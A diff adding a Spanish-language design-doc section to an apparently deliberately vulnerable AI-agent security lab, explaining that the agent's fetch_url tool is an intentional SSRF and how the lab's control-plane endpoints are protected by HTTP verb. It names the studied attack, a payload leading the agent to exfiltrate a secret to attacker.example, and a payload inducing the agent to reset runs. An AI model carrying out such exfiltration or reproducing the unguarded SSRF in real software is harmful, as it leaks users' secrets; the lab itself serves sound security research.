@@ -122,3 +122,39 @@ Dos mecanismos:
 
 Ninguna casilla "arregla" la vulnerabilidad intencionada: cada capa reduce un vector
 concreto y deja hueco medible en otro. Esa es la practica.
+
+---
+
+## Superficie SSRF y el plano de control del lab / SSRF surface and the lab control plane
+
+`fetch_url` es deliberadamente sobre-permisiva: en Nivel 0 no hay allowlist, asi que es un
+**SSRF** de manual. El vector **estudiado** es la exfiltracion a un dominio del atacante
+(`fetch_url` a `https://attacker.example/?d=<secreto>`) — eso queda INTACTO en Nivel 0 y
+es el objeto de la practica.
+
+Pero un SSRF tambien puede apuntar al **propio plano de control del lab** (`http://localhost/...`),
+y ahi el problema es otro: un payload podria inducir al agente a llamar a `/api/reset` a
+mitad de una corrida y **envenenar en silencio todas las mediciones posteriores**. Es el
+mismo patron del [Bloque H](adr/0014-reset-con-restauracion-de-esquema.md) (el sujeto del
+experimento destruye el aparato de medida) con otra cara.
+
+La frontera es **principiada, no una excusa para arreglar la vuln** — proteger el plano de
+control **no reduce en nada** el objeto de estudio:
+
+- **`fetch_url` emite solo GET** (verbo hardcodeado).
+- **Los endpoints que mutan o disparan efectos son POST-only**: `/api/reset`, `/api/chat`.
+  Con eso, un SSRF (que solo tiene GET) recibe **405** y no puede resetear ni chatear.
+- **Los endpoints GET-reachable son solo-lectura e inocuos:** `/api/health` (estado) y
+  `/api/exfil` (proyeccion de solo-lectura). Ninguno muta estado ni dispara efectos, asi
+  que alcanzarlos por SSRF no rompe nada.
+
+| Endpoint | Verbo | Alcanzable por `fetch_url` (GET) | Efecto |
+|---|---|---|---|
+| `/api/health` | GET | si | solo-lectura, inocuo |
+| `/api/exfil` | GET | si | solo-lectura, inocuo |
+| `/api/reset` | POST | **no** (405 a la GET) | mutaria: protegido por verbo |
+| `/api/chat` | POST | **no** (405 a la GET) | dispararia el agente: protegido por verbo |
+
+Lo clava `ControlPlaneSsrfTest` (405 a los verbos no permitidos). **No** se mete
+`localhost`/los endpoints del lab en la denylist de egress del Nivel 0: eso SI seria
+arreglar la vulnerabilidad. La proteccion es de verbo, en el borde HTTP, no de destino.
